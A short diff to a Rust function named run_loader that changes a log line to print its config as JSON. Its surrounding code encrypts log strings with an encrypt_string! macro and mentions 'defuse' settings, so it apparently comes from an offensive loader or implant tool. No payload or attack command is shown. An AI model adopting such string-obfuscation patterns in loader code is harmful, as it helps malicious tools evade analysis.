@@ -114,7 +114,7 @@ pub fn run_loader() {
             run_data.loop_nb,
             encrypt_string!(" --------------------------------------------------------")
         );
-        info!("{}{:?}", encrypt_string!("[+] Active LOADER: "), config);
+        info!("{}{}", encrypt_string!("[+] Active LOADER: "), serde_json::to_string(&config).unwrap_or_default());
 
         info!("{}", encrypt_string!("[+] DEFUSE UPDATE config"));
         if config.stop_defuse(&config.defuse_update) {
